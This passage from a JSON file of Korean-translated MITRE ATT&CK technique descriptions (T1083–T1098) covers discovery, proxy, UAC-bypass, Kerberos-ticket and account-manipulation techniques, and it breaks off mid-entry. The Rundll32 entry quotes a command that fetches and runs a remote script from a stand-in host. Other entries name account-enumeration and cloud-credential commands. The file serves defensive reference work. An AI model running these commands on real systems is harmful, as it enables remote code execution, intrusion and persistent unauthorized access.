      "description": "적대자는 파일 시스템 내에서 특정 정보를 찾기 위해 호스트 또는 네트워크 공유의 특정 위치에서 파일 및 디렉토리를 열거할 수 있습니다. 적대자는 자동화된 탐색 도중 [파일 및 디렉토리 탐색](https://attack.mitre.org/techniques/T1083)으로부터 얻은 정보를 사용하여 이후 행동을 형성할 수 있으며, 여기에는 적대자가 목표를 완전히 감염시키거나 특정 행동을 시도할지 여부가 포함됩니다.\n\n이 정보를 얻기 위해 많은 명령 프롬프트 유틸리티를 사용할 수 있습니다. 예를 들면 <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, <code>locate</code> 등이 있습니다. (출처: Windows Commands JPCERT) 사용자 정의 도구 또한 파일 및 디렉토리 정보를 수집하고 [네이티브 API](https://attack.mitre.org/techniques/T1106)와 상호작용하는 데 사용될 수 있습니다. 적대자는 또한 네트워크 장치에서 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008)를 활용하여 파일 및 디렉토리 정보를 수집할 수 있습니다 (예: <code>dir</code>, <code>show flash</code>, 및/또는 <code>nvram</code>). (출처: US-CERT-TA18-106A)\n\n일부 파일 및 디렉토리는 접근을 위해 승격된 권한이나 특정 사용자 권한을 요구할 수 있습니다.",
      "external_id": "T1083",
      "modified": "2024-04-16T12:40:10.978Z",
      "title": "File and Directory Discovery",
      "translated": true
    },
    {
      "description": "Windows 관리 도구(Windows Management Instrumentation, WMI)는 정의된 이벤트가 발생할 때 코드를 실행하는 이벤트 필터, 제공자, 소비자 및 바인딩을 설치하는 데 사용될 수 있습니다. 공격자는 WMI의 기능을 사용하여 이벤트에 구독하고 해당 이벤트가 발생할 때 임의의 코드를 실행하여 시스템의 지속성을 제공할 수 있습니다. 공격자는 WMI 스크립트를 Windows 관리 개체(Management Object, MOF) 파일(.mof 확장자)로 컴파일하여 이 기술의 탐지를 회피하려고 할 수 있습니다. (출처: Dell WMI Persistence) 구독할 수 있는 이벤트의 예로는 시계 시간 또는 컴퓨터의 가동 시간이 있습니다. (출처: Kazanciyan 2014) 여러 위협 그룹이 이 기술을 사용하여 지속성을 유지한 사례가 보고되었습니다. (출처: Mandiant M-Trends 2015)",
      "external_id": "T1084",
      "modified": "2020-01-24T14:08:23.156Z",
      "title": "Windows Management Instrumentation Event Subscription",
      "translated": true
    },
    {
      "description": "rundll32.exe 프로그램은 임의의 바이너리를 실행하기 위해 호출될 수 있습니다. 공격자는 이 기능을 활용하여 코드 실행을 프록시 처리하여, 정상적인 운영을 위해 rundll32.exe를 사용하는 Windows의 화이트리스트나 잘못된 긍정 반응으로 인해 rundll32.exe 프로세스의 실행 모니터링을 차단할 수 있는 보안 도구를 여는 것을 피할 수 있습니다.\n\nRundll32.exe는 문서화되지 않은 shell32.dll 기능인 <code>Control_RunDLL</code> 및 <code>Control_RunDLLAsUser</code>를 통해 제어판 항목 파일(.cpl)을 실행하는 데 사용할 수 있습니다. .cpl 파일을 두 번 클릭하는 것도 rundll32.exe를 실행합니다. (출처: Trend Micro CPL)\n\nRundll32는 JavaScript와 같은 스크립트를 실행하는 데에도 사용될 수 있습니다. 이는 다음과 유사한 구문을 사용하여 수행할 수 있습니다: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>. 이러한 동작은 Poweliks와 같은 악성 소프트웨어에서 사용된 사례가 있었습니다. (출처: This is Security Command Line Confusion)",
      "external_id": "T1085",
      "modified": "2020-01-31T19:01:41.919Z",
      "title": "Rundll32",
      "translated": true
    },
    {
      "description": "PowerShell은 Windows 운영 체제에 포함된 강력한 대화형 명령줄 인터페이스 및 스크립팅 환경입니다. (출처: TechNet PowerShell) 공격자는 PowerShell을 사용하여 정보 검색 및 코드 실행을 포함한 여러 작업을 수행할 수 있습니다. 예를 들어, Start-Process cmdlet은 실행 파일을 실행하는 데 사용할 수 있으며, Invoke-Command cmdlet은 로컬 또는 원격 컴퓨터에서 명령을 실행하는 데 사용됩니다.\n\nPowerShell은 또한 인터넷에서 실행 파일을 다운로드하고 실행하는 데 사용될 수 있으며, 이는 디스크에서 또는 메모리에서 디스크에 직접 접근하지 않고 실행될 수 있습니다.\n\n원격 시스템에 연결하기 위해 PowerShell을 사용하려면 관리자 권한이 필요합니다.\n\nEmpire, PowerSploit (출처: Powersploit), PSAttack 등 여러 PowerShell 기반 공격 테스트 도구가 제공됩니다. (출처: Github PSAttack)\n\nPowerShell 명령/스크립트는 .NET 프레임워크 및 Windows 공통 언어 인터페이스(CLI)를 통해 노출된 PowerShell의 기본 System.Management.Automation 어셈블리에 대한 인터페이스를 통해 powershell.exe 바이너리를 직접 호출하지 않고도 실행될 수 있습니다. (출처: Sixdub PowerPick Jan 2016)(출처: SilentBreak Offensive PS Dec 2015) (출처: Microsoft PSfromCsharp APR 2014)",
      "external_id": "T1086",
      "modified": "2020-03-09T13:51:06.334Z",
      "title": "PowerShell",
      "translated": true
    },
    {
      "description": "적대자는 시스템 내 또는 손상된 환경에서 유효한 계정, 사용자 이름 또는 이메일 주소의 목록을 얻으려고 할 수 있습니다. 이러한 정보는 적대자가 어떤 계정이 존재하는지 파악하는 데 도움을 줄 수 있으며, 이는 브루트 포싱, 스피어 피싱 공격 또는 계정 탈취와 같은 후속 행동에 도움이 될 수 있습니다(예: [유효한 계정](https://attack.mitre.org/techniques/T1078)).\n\n적대자는 계정을 나열하기 위해 기존 도구의 남용, 내장 명령 사용 또는 특정 환경에서 계정 이름과 역할 또는 권한이 유출되는 잠재적 잘못된 구성 등의 여러 방법을 사용할 수 있습니다.\n\n예를 들어, 클라우드 환경은 일반적으로 사용자 목록을 얻기 위한 쉽게 접근 가능한 인터페이스를 제공합니다. (인용: AWS 사용자 목록) (인용: Google Cloud - IAM 서비스 계정 목록 API) 호스트에서는 적대자가 기본 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 및 기타 명령줄 기능을 사용하여 계정을 식별할 수 있습니다. 이메일 주소 및 계정에 대한 정보는 감염된 시스템의 파일을 검색하여 추출할 수도 있습니다.",
      "external_id": "T1087",
      "modified": "2024-10-15T15:35:28.784Z",
      "title": "Account Discovery",
      "translated": true
    },
    {
      "description": "공격자는 로컬 시스템 계정 목록을 확인하려고 할 수 있습니다. 이 정보는 공격자가 시스템에 존재하는 로컬 계정을 파악하고 후속 행동을 지원하는 데 도움이 될 수 있습니다.\n\n<code>net user</code> 및 <code>net localgroup</code>와 같은 [Net](https://attack.mitre.org/software/S0039) 유틸리티의 명령어와 macOS 및 Linux에서 사용하는 <code>id</code>와 <code>groups</code>는 로컬 사용자 및 그룹을 나열할 수 있습니다. (출처: Mandiant APT1)(출처: id 매뉴얼)(출처: groups 매뉴얼) Linux에서는 <code>/etc/passwd</code> 파일을 통해 로컬 사용자를 열거할 수도 있습니다. macOS에서는 <code>dscl . list /Users</code> 명령어를 사용하여 로컬 계정을 열거할 수 있습니다.",
      "external_id": "T1087.001",
      "modified": "2024-01-11T23:47:44.655Z",
      "title": "Local Account",
      "translated": true
    },
    {
      "description": "적대자는 도메인 계정 목록을 얻으려고 할 수 있습니다. 이 정보는 적대자가 특정 권한을 가진 특정 계정을 목표로 삼는 등의 후속 행동을 수행하는 데 도움을 줄 수 있습니다.\n\n다음과 같은 명령어들로 도메인 사용자 및 그룹을 나열할 수 있습니다: <code>net user /domain</code> 및 <code>net group /domain</code> (Windows의 [Net](https://attack.mitre.org/software/S0039) 유틸리티), <code>dscacheutil -q group</code> (macOS), <code>ldapsearch</code> (Linux). 또한 [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet인 <code>Get-ADUser</code> 및 <code>Get-ADGroupMember</code>를 사용하면 Active Directory 그룹의 구성원을 나열할 수 있습니다. (출처: CrowdStrike StellarParticle 2022년 1월)",
      "external_id": "T1087.002",
      "modified": "2024-05-31T04:00:37.651Z",
      "title": "Domain Account",
      "translated": true
    },
    {
      "description": "적대자는 이메일 주소 및 계정 목록을 가져오려고 시도할 수 있습니다. 적대자는 글로벌 주소 목록(GAL)과 같은 Exchange 주소 목록을 덤프하려고 할 수 있습니다. (인용: Microsoft Exchange 주소 목록)\n\n온프레미스 Exchange 및 Exchange Online에서는 <code>Get-GlobalAddressList</code> PowerShell cmdlet을 사용하여 인증 세션을 통해 도메인에서 이메일 주소와 계정을 얻을 수 있습니다. (인용: Microsoft getglobaladdresslist)(인용: Black Hills Attacking Exchange MailSniper, 2016)\n\nGoogle Workspace에서는 GAL이 Google Workspace Sync for Microsoft Outlook (GWSMO) 서비스를 통해 Microsoft Outlook 사용자와 공유됩니다. 또한 Google Workspace 디렉토리를 사용하면 조직 내 다른 사용자 목록을 얻을 수 있습니다. (인용: Google Workspace 글로벌 액세스 목록)",
      "external_id": "T1087.003",
      "modified": "2024-10-17T20:35:35.125Z",
      "title": "Email Account",
      "translated": true
    },
    {
      "description": "대적자는 클라우드 계정의 목록을 얻으려고 시도할 수 있습니다. 클라우드 계정은 조직에서 사용자를 위해, 원격 지원, 서비스, 또는 클라우드 서비스 제공업체 또는 SaaS 애플리케이션 내 리소스 관리를 위해 생성하고 구성한 계정입니다.\n\n인증된 접근이 있을 경우, 여러 도구를 사용하여 계정을 찾을 수 있습니다. <code>Get-MsolRoleMember</code> PowerShell cmdlet을 사용하면 Office 365에서 역할 또는 권한 그룹이 제공하는 계정 이름을 얻을 수 있습니다.(출처: Microsoft msolrolemember)(출처: GitHub Raindance) Azure CLI (AZ CLI) 또한 도메인에 대해 인증된 접근을 가진 사용자 계정을 얻기 위한 인터페이스를 제공합니다. <code>az ad user list</code> 명령어는 도메인 내의 모든 사용자를 나열합니다.(출처: Microsoft AZ CLI)(출처: Black Hills Red Teaming MS AD Azure, 2018)\n\nAWS 명령 <code>aws iam list-users</code>를 사용하면 현재 계정의 사용자 목록을 얻을 수 있으며, <code>aws iam list-roles</code>를 사용하면 지정한 경로 접두사가 있는 IAM 역할을 얻을 수 있습니다.(출처: AWS List Roles)(출처: AWS List Users) GCP에서는 <code>gcloud iam service-accounts list</code>와 <code>gcloud projects get-iam-policy</code>를 사용하여 프로젝트 내 서비스 계정 및 사용자의 목록을 얻을 수 있습니다.(출처: Google Cloud - IAM 서비스 계정 목록 API)",
      "external_id": "T1087.004",
      "modified": "2024-10-15T15:51:18.808Z",
      "title": "Cloud Account",
      "translated": true
    },
    {
      "description": "Windows 사용자 계정 컨트롤(UAC)은 프로그램이 관리자로서의 권한으로 작업을 수행하기 위해 사용자에게 확인을 요청하면서 권한을 상승시킬 수 있도록 허용하는 기능입니다. 사용자에게 미치는 영향은 높은 강제로 인해 작업이 거부되는 것부터, 로컬 관리자 그룹에 있는 경우 프롬프트를 클릭하여 작업을 수행할 수 있도록 하거나, 작업을 완료하기 위해 관리자 비밀번호를 입력할 수 있도록 하는 것까지 다양합니다. (출처: TechNet UAC 작동 방식)\n\n컴퓨터의 UAC 보호 수준이 가장 높은 수준이 아닌 경우, 특정 Windows 프로그램은 UAC 알림 상자를 통해 사용자에게 요청하지 않고도 권한을 상승시키거나 일부 상승된 COM 개체를 실행할 수 있습니다. (출처: TechNet UAC 내부) (출처: MSDN COM 상승) 예를 들어, rundll32.exe를 사용하여 특수 제작된 DLL을 로드하고 자동 상승된 COM 개체를 로드하여 일반적으로 상승된 접근이 필요한 보호 된 디렉터리에서 파일 작업을 수행하는 경우입니다. 또한, 악성 소프트웨어가 신뢰할 수 있는 프로세스에 주입되어 사용자에게 요청하지 않고도 상승된 권한을 얻을 수 있습니다. (출처: Davidson Windows) 공격자는 보호되지 않은 대상 프로세스에서 이러한 기술을 사용하여 관리자로서의 권한을 상승시킬 수 있습니다.\n\nUAC를 우회하는 방법이 여러 가지 발견되었습니다. UACMe의 Github README 페이지에는 발견되었고 UACMe에 구현된 방법에 대한 광범위한 목록이 포함되어 있습니다. (출처: Github UACMe) 그러나 모든 우회 방법의 포괄적인 목록이 아닐 수 있습니다. 추가적인 우회 방법은 정기적으로 발견되며, 실제로 사용되는 경우도 있습니다. 예를 들어:\n\n* <code>eventvwr.exe</code>는 자동으로 상승하고 지정된 바이너리 또는 스크립트를 실행할 수 있습니다. (출처: enigma0x3 파일 없는 UAC 우회) (출처: Fortinet Fareit)\n\n또 다른 우회 방법은 관리자 권한이 있는 계정의 자격 증명이 알려진 경우, 일부 측면 이동 기술을 통해 가능합니다. UAC는 단일 시스템 보안 메커니즘이므로, 한 시스템에서 실행 중인 프로세스의 권한이나 무결성은 측면 시스템에서 알 수 없으며 기본적으로 높은 무결성으로 설정됩니다. (출처: SANS UAC 우회)",
      "external_id": "T1088",
      "modified": "2020-02-05T20:08:32.863Z",
      "title": "Bypass User Account Control",
      "translated": true
    },
    {
      "description": "적대자는 도구 및 활동의 탐지를 피하기 위해 보안 도구를 비활성화할 수 있습니다. 이는 보안 소프트웨어나 이벤트 로깅 프로세스를 종료하거나, 도구가 실행 시 시작되지 않도록 레지스트리 키를 삭제하는 형태를 취할 수 있으며, 보안 스캔 또는 이벤트 보고를 방해하는 다른 방법을 사용할 수도 있습니다.",
      "external_id": "T1089",
      "modified": "2020-02-21T20:35:48.979Z",
      "title": "Disabling Security Tools",
      "translated": true
    },
    {
      "description": "적대 세력은 연결 프록시를 사용하여 시스템 간의 네트워크 트래픽을 유도하거나 명령 및 제어 서버와의 네트워크 통신을 위한 중개자 역할을 하여 자신의 인프라에 대한 직접 연결을 피할 수 있습니다. 트래픽을 프록시를 통해 리디렉션하거나 포트를 리디렉션하는 데 도움이 되는 많은 도구가 존재하며, 여기에는 [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy 및 ZXPortMap이 포함됩니다. (출처: Trend Micro APT 공격 도구) 적대 세력은 이러한 유형의 프록시를 사용하여 명령 및 제어 통신을 관리하고, 동시에 여러 개의 아웃바운드 네트워크 연결 수를 줄이며, 연결 손실에 대한 복원력을 제공하거나, 피해자 간의 기존 신뢰 통신 경로를 통해 의심을 피하기 위해 사용합니다. 또한 적대 세력은 여러 개의 프록시를 연계하여 악성 트래픽의 출처를 더욱 숨길 수 있습니다.\n\n또한, 적대 세력은 콘텐츠 배달 네트워크(CDN)의 라우팅 구조를 활용하여 명령 및 제어 트래픽을 프록시할 수 있습니다.",
      "external_id": "T1090",
      "modified": "2021-08-30T19:16:11.648Z",
      "title": "Proxy",
      "translated": true
    },
    {
      "description": "적대 세력은 침해된 환경에서 두 개 이상의 시스템 간의 명령 및 제어(C2) 트래픽을 관리하기 위해 내부 프록시를 사용할 수 있습니다. 프록시 또는 포트 리디렉션을 통해 트래픽 리디렉션을 가능하게 하는 여러 도구가 존재하며, 여기에는 [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy 및 ZXPortMap 등이 포함됩니다. (인용: 트렌드 마이크로 APT 공격 도구) 적대 세력은 침해된 환경 내에서 명령 및 제어 통신을 관리하기 위해 내부 프록시를 사용하며, 이는 동시에 발생하는 아웃바운드 네트워크 연결의 수를 줄이고, 연결 손실의 상황에서도 회복력을 제공하며, 의심을 피하기 위해 감염된 시스템 간의 기존 신뢰할 수 있는 통신 경로를 통해 우회하는 데 도움을 줍니다. 내부 프록시 연결은 SMB와 같은 일반적인 피어 투 피어(p2p) 네트워킹 프로토콜을 사용할 수 있으며, 이는 환경에 더 잘 녹아들 수 있도록 합니다.\n\n적대 세력이 침해된 내부 시스템을 프록시로 사용하면 C2 트래픽의 진짜 목적지를 숨기면서 외부 시스템과의 수많은 연결 필요성을 줄일 수 있습니다.",
      "external_id": "T1090.001",
      "modified": "2024-03-07T14:29:02.408Z",
      "title": "Internal Proxy",
      "translated": true
    },
    {
      "description": "적대 세력은 명령 및 제어(C2) 서버에 대한 네트워크 통신의 중개 역할을 하기 위해 외부 프록시를 사용할 수 있으며, 이를 통해 그들의 인프라에 대한 직접 연결을 피할 수 있습니다. 트래픽을 프록시 또는 포트를 통해 리디렉션할 수 있는 다양한 도구들이 존재하며, 예를 들어 [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy 및 ZXPortMap 등이 있습니다. (출처: Trend Micro APT 공격 도구) 적대 세력은 이러한 유형의 프록시를 사용하여 명령 및 제어 통신을 관리하고, 연결 손실에 대한 회복력을 제공하며, 의심을 피하기 위해 기존의 신뢰된 통신 경로를 활용합니다.\n\n외부 연결 프록시는 C2 트래픽의 목적지를 숨기기 위해 사용되며, 일반적으로 포트 리디렉터와 함께 구현됩니다. 피해자 환경 외부의 손상된 시스템이 이러한 목적으로 사용될 수 있으며, 클라우드 기반 자원이나 가상 사설 서버와 같은 구매한 인프라도 활용될 수 있습니다. 손상된 시스템에서 이들과 연결될 가능성이 낮은 프록시가 선택될 수 있습니다. 피해자 시스템은 인터넷의 외부 프록시와 직접 통신한 후, 프록시는 C2 서버로 통신을 전달합니다.",
      "external_id": "T1090.002",
      "modified": "2024-04-16T12:19:08.953Z",
      "title": "External Proxy",
      "translated": true
    },
    {
      "description": "공격자는 악의적인 트래픽의 출처를 숨기기 위해 여러 개의 프록시를 연결할 수 있습니다. 일반적으로 방어자는 자신의 네트워크에 들어오기 전 마지막 프록시의 트래픽을 식별할 수 있지만, 마지막 홉 프록시 이전의 다른 프록시를 식별할 수 있을지는 불확실합니다. 이 기법은 방어자가 여러 프록시를 통해 악의적인 트래픽을 추적해야 하므로 악의적인 트래픽의 원래 출처를 식별하는 것을 더욱 어렵게 만듭니다.\n\n예를 들어, 공격자는 공개적으로 사용 가능한 [Tor](https://attack.mitre.org/software/S0183) 네트워크와 같은 양파 라우팅 네트워크를 구성하거나 이를 사용하여 침해된 단체를 통해 암호화된 C2 트래픽을 전송하고, 네트워크 내의 아무 장치와도 통신할 수 있게 합니다. (인용: 양파 라우팅) 공격자는 또한 가상 사설 서버(VPS), 사물인터넷(IoT) 장치, 스마트 장치 및 사용이 끝난 라우터로 구성된 운영 중계 박스(ORB) 네트워크를 사용하여 자신의 운영을 모호하게 만들 수 있습니다. (인용: ORB 맨디안)\n\n네트워크 인프라의 경우, 공격자가 여러 개의 침해된 장치를 활용하여 다중 홉 프록시 체인을 생성할 수 있습니다(즉, [네트워크 장치](https://attack.mitre.org/techniques/T1584/008)). 공격자는 라우터에서 [패치 시스템 이미지](https://attack.mitre.org/techniques/T1601/001)를 활용하여 해당 네트워크 장치에 사용자 정의 코드를 추가하여 해당 노드 간에 양파 라우팅을 구현할 수 있습니다. 이 방법은 공격자가 인터넷 경계의 보호 네트워크 경계를 넘어 조직의 광역 네트워크(WAN)로 침투할 수 있는 [네트워크 경계 브리징](https://attack.mitre.org/techniques/T1599) 방법에 의존합니다. ICMP와 같은 프로토콜이 전송 수단으로 사용될 수 있습니다.\n\n비슷하게, 공격자는 피어 투 피어(P2P) 및 블록체인 지향 인프라를 악용하여 분산된 네트워크의 피어 간 라우팅을 구현할 수 있습니다. (인용: NGLite 트로이목마)",
      "external_id": "T1090.003",
      "modified": "2024-09-25T20:48:24.411Z",
      "title": "Multi-hop Proxy",
      "translated": true
    },
    {
      "description": "공격자는 여러 도메인을 호스팅하는 콘텐츠 배달 네트워크 (CDN) 및 기타 서비스의 라우팅 방식을 이용하여 HTTPS 트래픽 또는 HTTPS를 통해 터널링된 트래픽의 의도된 목적지를 숨길 수 있습니다. (출처: Fifield, \"Blocking Resistent Communication through domain fronting\", 2015) 도메인 프론팅은 TLS 헤더의 SNI 필드와 HTTP 헤더의 Host 필드에서 서로 다른 도메인 이름을 사용하는 것을 포함합니다. 두 도메인이 동일한 CDN에서 제공되는 경우, CDN은 TLS 헤더를 해독한 후 HTTP 헤더에 지정된 주소로 라우팅할 수 있습니다. 이 기술의 변형인 \"도메인 없는\" 프론팅은 SNI 필드를 비워두는 것을 이용합니다. 이렇게 하면 CDN이 SNI와 HTTP Host 필드가 일치하는지를 확인하려고 할 때도 프론팅이 작동할 수 있습니다 (비어 있는 SNI 필드가 무시될 경우).\n\n예를 들어, domain-x와 domain-y가 동일한 CDN의 고객인 경우, TLS 헤더에 domain-x를 넣고 HTTP 헤더에 domain-y를 넣을 수 있습니다. 트래픽은 domain-x로 가는 것처럼 보이지만, 실제로 CDN은 이를 domain-y로 라우팅할 수 있습니다.",
      "external_id": "T1090.004",
      "modified": "2023-03-30T21:01:52.356Z",
      "title": "Domain Fronting",
      "translated": true
    },
    {
      "description": "적대 세력은 이동 가능한 매체에 악성 코드를 복사하고, 매체가 시스템에 삽입될 때 자동 실행 기능을 이용하여 고립되거나 공기 단절된 네트워크에 있는 시스템으로 이동할 수 있습니다. 수평 이동(Lateral Movement)의 경우, 이는 이동 가능한 매체에 저장된 실행 파일을 수정하거나, 악성 코드를 복사하여 합법적인 파일처럼 이름을 변경하여 사용자가 별도의 시스템에서 실행하도록 속이는 방식으로 발생할 수 있습니다. 초기 접근(Initial Access)의 경우, 이는 매체를 수동으로 조작하거나, 매체를 처음 포맷하는 데 사용된 시스템을 수정하거나, 매체의 펌웨어를 수정하는 방식으로 발생할 수 있습니다.\n\n모바일 장치가 USB를 통해 연결될 경우, PC에 악성 코드를 감염시키는 데 사용될 수도 있습니다. (출처: 스마트폰 USB 악용) 이 감염은 Android, iOS 등과 같은 장치나 USB 충전 케이블을 사용하여 발생할 수 있습니다. (출처: 윈도우 악성 코드가 안드로이드를 감염시키는 경우)(출처: 아이폰 충전 케이블 해킹) 예를 들어, 스마트폰이 시스템에 연결되면 USB 연결 디스크 드라이브처럼 마운트된 것처럼 보일 수 있습니다. 연결된 시스템과 호환되는 악성 코드가 모바일 장치에 있으면, 해당 악성 코드는 시스템을 감염시킬 수 있습니다(특히 자동 실행 기능이 활성화된 경우).",
      "external_id": "T1091",
      "modified": "2023-10-17T20:42:21.453Z",
      "title": "Replication Through Removable Media",
      "translated": true
    },
    {
      "description": "적대자는 시스템 간에 명령 및 제어를 수행할 수 있으며, 이는 분리된 네트워크에서도 가능하며, 이를 위해 이동식 미디어를 사용하여 명령을 시스템 간에 전송합니다. (출처: ESET Sednit USBStealer 2014) 두 시스템 모두 손상되어야 하며, 첫 번째 시스템이 인터넷에 연결되어 손상된 후, 두 번째 시스템은 [이동식 미디어를 통한 복제](https://attack.mitre.org/techniques/T1091)를 통해 수평 이동에 의해 손상되었을 가능성이 큽니다. 명령과 파일은 분리된 시스템에서 적대자가 직접 접근할 수 있는 인터넷에 연결된 시스템으로 전달됩니다.",
      "external_id": "T1092",
      "modified": "2024-01-31T03:17:42.004Z",
      "title": "Communication Through Removable Media",
      "translated": true
    },
    {
      "description": "프로세스 홀로잉(Process Hollowing)은 프로세스가 일시 중지된 상태에서 생성된 후, 해당 프로세스의 메모리가 언맵(unmap)되고 악성 코드로 대체되는 경우를 말합니다. 이는 [프로세스 주입(Process Injection)](https://attack.mitre.org/techniques/T1055)과 유사하며, 악성 코드의 실행이 합법적인 프로세스 아래에서 가려져 방어 및 탐지 분석을 회피할 수 있습니다. (출처: Leitch Hollowing) (출처: Elastic Process Injection July 2017)",
      "external_id": "T1093",
      "modified": "2020-11-10T18:29:30.437Z",
      "title": "Process Hollowing",
      "translated": true
    },
    {
      "description": "공격자는 기존의 [응용 계층 프로토콜](https://attack.mitre.org/techniques/T1071)에 명령/데이터를 캡슐화하는 대신, 맞춤형 명령 및 제어 프로토콜을 사용하여 통신할 수 있습니다. 여기에는 잘 알려진 프로토콜을 모방하거나 TCP/IP/다른 표준 네트워크 스택에서 제공하는 기본 프로토콜 위에 맞춤형 프로토콜(예: 원시 소켓)을 개발하는 구현이 포함됩니다.",
      "external_id": "T1094",
      "modified": "2020-03-20T19:03:04.295Z",
      "title": "Custom Command and Control Protocol",
      "translated": true
    },
    {
      "description": "위협 행위자는 호스트와 C2 서버 간 또는 네트워크 내 감염된 호스트 간의 통신을 위해 OSI 비응용 계층 프로토콜을 사용할 수 있습니다. 가능한 프로토콜의 목록은 광범위합니다. (출처: 위키백과 OSI) 특정 예로는 인터넷 제어 메시지 프로토콜(ICMP)과 같은 네트워크 계층 프로토콜, 사용자 데이터그램 프로토콜(UDP)과 같은 전송 계층 프로토콜, 소켓 보안(SOCKS)과 같은 세션 계층 프로토콜, 직렬 LAN(SOL)과 같은 리다이렉트/터널링 프로토콜 등이 있습니다.\n\n호스트 간의 ICMP 통신이 한 가지 예입니다. (출처: Cisco Synful Knock Evolution) ICMP는 인터넷 프로토콜 스위트의 일부로, 모든 IP 호환 호스트에서 구현해야 합니다. (출처: Microsoft ICMP) 그러나 TCP나 UDP와 같은 다른 인터넷 프로토콜만큼 일반적으로 모니터링되지 않기 때문에 위협 행위자가 통신을 숨기기 위해 사용할 수 있습니다.",
      "external_id": "T1095",
      "modified": "2023-09-29T21:07:31.570Z",
      "title": "Non-Application Layer Protocol",
      "translated": true
    },
    {
      "description": "모든 New Technology File System (NTFS) 포맷의 파티션은 파티션 내 모든 파일/디렉토리의 기록을 유지하는 마스터 파일 테이블(MFT)을 포함합니다. (인용: SpectorOps Host-Based Jul 2017) MFT 항목 내에는 파일 속성(인용: Microsoft NTFS File Attributes Aug 2010)과 같은 확장 속성(Extended Attributes, EA) 및 데이터(여러 데이터 속성이 존재할 때 대체 데이터 스트림(Alternate Data Streams, ADS)으로 알려짐)가 포함되어 있으며, 이를 통해 임의의 데이터(심지어 전체 파일)도 저장할 수 있습니다. (인용: SpectorOps Host-Based Jul 2017) (인용: Microsoft File Streams) (인용: MalwareBytes ADS July 2015) (인용: Microsoft ADS Mar 2014)\n\n공격자는 파일 속성 메타데이터에 악성 데이터나 이진 파일을 저장할 수 있으며, 이는 파일에 직접 저장하기보다 일부 방어 수단(예: 정적 지표 스캔 도구 및 안티바이러스)을 피하기 위해 수행될 수 있습니다. (인용: Journey into IR ZeroAccess NTFS EA) (인용: MalwareBytes ADS July 2015)",
      "external_id": "T1096",
      "modified": "2020-03-13T21:04:13.284Z",
      "title": "NTFS File Attributes",
      "translated": true
    },
    {
      "description": "패스 더 티켓(PtT)은 계정의 비밀번호에 접근하지 않고도 Kerberos 티켓을 사용하여 시스템에 인증하는 방법입니다. Kerberos 인증은 원격 시스템으로의 측면 이동을 위한 첫 번째 단계로 사용될 수 있습니다.\n\n이 기술에서는 [유효한 계정](https://attack.mitre.org/techniques/T1078)에 대한 유효한 Kerberos 티켓이 [운영 체제 자격 증명 덤핑](https://attack.mitre.org/techniques/T1003)으로 캡처됩니다. 사용자 서비스 티켓 또는 티켓 부여 티켓(TGT)을 접근 수준에 따라 얻을 수 있습니다. 서비스 티켓은 특정 리소스에 대한 접근을 허용하며, TGT는 티켓 부여 서비스(TGS)로부터 서비스 티켓을 요청하여 사용자가 접근 권한을 가진 어떤 리소스에든 접근할 수 있도록 합니다. (출처: ADSecurity AD Kerberos Attacks) (출처: GentilKiwi Pass the Ticket)\n\n실버 티켓은 Kerberos를 인증 메커니즘으로 사용하는 서비스에 대해 얻을 수 있으며, 이는 해당 리소스 및 리소스를 호스팅하는 시스템(예: SharePoint)에 접근하기 위해 생성되는 티켓을 만드는데 사용됩니다. (출처: ADSecurity AD Kerberos Attacks)\n\n골든 티켓은 도메인에 대해 키 배포 서비스 계정인 KRBTGT 계정의 NTLM 해시를 사용하여 얻을 수 있으며, 이를 통해 Active Directory의 어떤 계정에 대해서도 TGT를 생성할 수 있습니다. (출처: Campbell 2014)",
      "external_id": "T1097",
      "modified": "2020-01-30T19:57:16.037Z",
      "title": "Pass the Ticket",
      "translated": true
    },
    {
      "description": "적대자는 피해 시스템에 대한 접근을 유지하고/또는 상승시키기 위해 계정을 조작할 수 있습니다. 계정 조작은 자격 증명이나 권한 그룹을 수정하는 등 적대자의 접근을 보존하거나 수정하는 모든 행동을 포함할 수 있습니다 (출처: FireEye SMOKEDHAM, 2021년 6월). 이러한 행동은 비밀번호 기간 정책을 우회하고 침해된 자격 증명의 수명을 연장하기 위해 반복적인 비밀번호 업데이트를 수행하는 등 보안 정책을 무시하기 위한 계정 활동을 포함할 수도 있습니다.\n\n계정을 생성하거나 조작하기 위해서는 적대자가 이미 시스템이나 도메인에서 충분한 권한을 가지고 있어야 합니다. 그러나 계정 조작은 추가 역할, 권한 또는 높은 권한의 [유효 계정](https://attack.mitre.org/techniques/T1078)에 대한 접근을 부여하는 수정으로 인해 권한 상승으로 이어질 수도 있습니다.",
      "external_id": "T1098",
      "modified": "2024-10-15T15:35:57.382Z",
      "title": "Account Manipulation",
      "translated": true
    },
    {
      "description": "상대방은 공격자가 제어하는 자격 증명을 클라우드 계정에 추가하여 피해자의 계정 및 환경 내 인스턴스에 지속적인 액세스를 유지할 수 있습니다.\n\n예를 들어, 공격자는 Azure / Entra ID의 기존 합법적인 자격 증명 외에도 서비스 프린시펄 및 애플리케이션에 대한 자격 증명을 추가할 수 있습니다. 이러한 자격 증명에는 x509 키 및 비밀번호가 포함됩니다. 충분한 권한이 있는 경우 Azure Portal, Azure Command Line Interface 및 Azure 또는 Az PowerShell 모듈을 사용하여 자격 증명을 추가하는 다양한 방법이 있습니다.\n\n인프라스트럭처-서비스(IaaS) 환경에서는 [클라우드 계정](https://attack.mitre.org/techniques/T1078/004)을 통해 액세스한 후, 공격자는 AWS의 <code>CreateKeyPair</code> 또는 <code>ImportKeyPair</code> API 또는 GCP의 <code>gcloud compute os-login ssh-keys add</code> 명령어를 사용하여 자신의 SSH 키를 생성하거나 가져올 수 있습니다. 이를 통해 손상된 클라우드 계정을 추가로 사용하지 않고도 클라우드 환경 내 인스턴스에 지속적으로 액세스할 수 있습니다.\n\n공격자는 또한 AWS의 <code>CreateAccessKey</code> API 또는 GCP의 <code>gcloud iam service-accounts keys create</code> 명령어를 사용하여 계정에 액세스 키를 추가할 수 있습니다. 또는 AWS에서 <code>CreateLoginProfile</code> API를 사용하여 AWS Management Console에 로그인하는 데 사용할 수 있는 비밀번호를 추가할 수 있습니다. 대상 계정의 권한이 